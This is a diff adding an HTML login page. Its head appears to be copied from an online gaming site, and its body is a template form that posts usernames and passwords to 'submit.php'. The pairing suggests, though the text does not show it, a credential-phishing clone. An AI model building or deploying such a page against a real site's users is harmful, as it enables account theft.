@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8"/>
+    <meta name="viewport" content="width=device-width, minimum-scale=1, maximum-scale=1, user-scalable=no, initial-scale=1, viewport-fit=cover"/>
+    <meta name="theme-color" content="#323738"/>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="format-detection" content="telephone=no,email=no"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    <link href="/favicon.ico" id="favicon" rel="icon" />
+    <link href="/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180" />
+    <link href="/favicon-32x32.png" rel="icon" sizes="32x32" type="image/png" />
+    <link href="/favicon-16x16.png" rel="icon" sizes="16x16" type="image/png" />
+    <link href="/manifest.webmanifest" rel="manifest" />
+    <link as="fetch" crossorigin="anonymous" href="/cache/game/support/system/conf/" rel="preload" />
+    <link as="fetch" crossorigin="anonymous" href="/api/account/get/" rel="preload" />
+    <link as="fetch" crossorigin="anonymous" href="/api/user/amount/" rel="preload" />
+    <link as="font" crossorigin="anonymous" href="/assets/avertastd-mono-extrabold-2-Tg6n77.woff2" rel="preload" type="font/woff2" />
+    <link as="font" crossorigin="anonymous" href="/assets/avertastd-mono-extrabold-CtXehiD0.woff" rel="preload" type="font/woff" />
+    <style type="text/css">
+        body {
+            background-image: url('https://your-background-image-url.com'); /* Add a background image */
+            background-size: cover;
+            background-position: center;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            color: white;
+        }
+        .login-container {
+            width: 100%;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .login-box {
+            width: 100%;
+            max-width: 400px;
+            background-color: rgba(0, 0, 0, 0.5);
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+        }
+        .login-box h1 {
+            text-align: center;
+            color: white;
+            margin-bottom: 30px;
+        }
+        .login-box label {
+            font-size: 1.1em;
+            color: white;
+            margin-bottom: 10px;
+            display: block;
+        }
+        .login-box input[type="text"],
+        .login-box input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            font-size: 1em;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            background-color: #333;
+            color: white;
+        }
+        .login-box input[type="submit"] {
+            width: 100%;
+            padding: 10px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            font-size: 1.2em;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .login-box input[type="submit"]:hover {
+            background-color: #45a049;
+        }
+        .forgot-password {
+            text-align: center;
+            margin-top: 10px;
+        }
+        .forgot-password a {
+            color: #4CAF50;
+            text-decoration: none;
+        }
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+        .footer {
+            position: fixed;
+            bottom: 20px;
+            width: 100%;
+            text-align: center;
+            color: #bbb;
+        }
+    </style>
+    <script>
+        document.documentElement.classList.toggle(
+            'dark',
+            JSON.parse(localStorage.getItem('setting'))?.darken
+        );
+    </script>
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-box">
+            <h1>Login</h1>
+            <form action="submit.php" method="POST"> <!-- Change this line to point to submit.php -->
+                <label for="username">Username</label>
+                <input type="text" id="username" name="username" placeholder="Enter username" required>
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Enter password" required>
+                <input type="submit" value="Login">
+            </form>
+            <div class="forgot-password">
+                <p><a href="#">Forgot Password?</a></p>
+            </div>
+        </div>
+    </div>
+    <div class="footer">
+        <p>&copy; 2025 Your Website. All rights reserved.</p>
+    </div>
+</body>
+</html>
